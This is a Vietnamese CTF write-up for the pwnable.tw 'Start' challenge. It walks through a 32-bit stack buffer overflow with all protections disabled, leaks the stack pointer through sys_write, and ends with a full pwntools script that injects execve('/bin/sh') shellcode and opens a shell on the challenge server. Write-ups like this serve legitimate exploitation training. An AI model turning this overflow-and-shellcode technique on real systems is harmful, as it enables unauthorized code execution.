---
title: Start

---

# Start
- Chương trình cho một file nhị phân 
- Chạy thử xem chương trình làm gì
![image](https://hackmd.io/_uploads/HkB8_8hhC.png)
- Kiểm tra checksec
![image](https://hackmd.io/_uploads/SJvxK823C.png)
- Tất cả chế độ bảo vệ đều tắt, vì đây là kiến trúc 32 bit nên các tham số được đưa vào stack trước khi syscall
- Chương trình cho ta nhập vào và kết thúc, debug để xem cách hoạt động
```
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d
   0x08048066 <+6>:     xor    eax,eax
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443
   0x08048073 <+19>:    push   0x20656874
   0x08048078 <+24>:    push   0x20747261
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4
   0x0804808f <+47>:    int    0x80
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3
   0x08048097 <+55>:    int    0x80
   0x08048099 <+57>:    add    esp,0x14
   0x0804809c <+60>:    ret
 ```
 - Đầu tiên đẩy địac hỉ của exit vào stack sau đó `sys_write` để in chuỗi `Let's start the CTF:`, cuối cùng là `sys_read` 0x3c byte
 - Có lỗi bof ta có thể tận dùng để chèn shellcode vì NX bị tắt
 - Nhưng để shellcode hoạt động thành công thì cần ret đến địa chỉ chứa shellcode đó
 - Tận dụng `sys_write` để leak được esp vì `mov    ecx,esp` để in được ra esp
 - Ta cần ret về `0x08048087` để leak được esp
 - Sau đó ta gửi payload lần 2 để có thể đưa được esp + offset cần để overwrite và nhập shellcode

```python=
#!/usr/bin/python3

from pwn import *

context.os = 'linux'
context.arch = 'i386'

#p = process('./start')
p = remote('chall.pwnable.tw', 10000)

payload = b'A'*20
payload += p32(0x8048087)

shell = asm('''
	push 6845231
	push 1852400175
	xor ecx, ecx
	xor edx, edx
	mov ebx, esp
	mov al, 0xb
	int 0x80
''')

log.info(shell)

input()
p.sendafter(b'CTF:', payload)
esp = u32(p.recv(4))
log.info(hex(esp + 20))

payload = b'A'*20
payload += p32(esp + 20)
payload += shell

sleep(2)

p.sendline(payload)

p.interactive()
```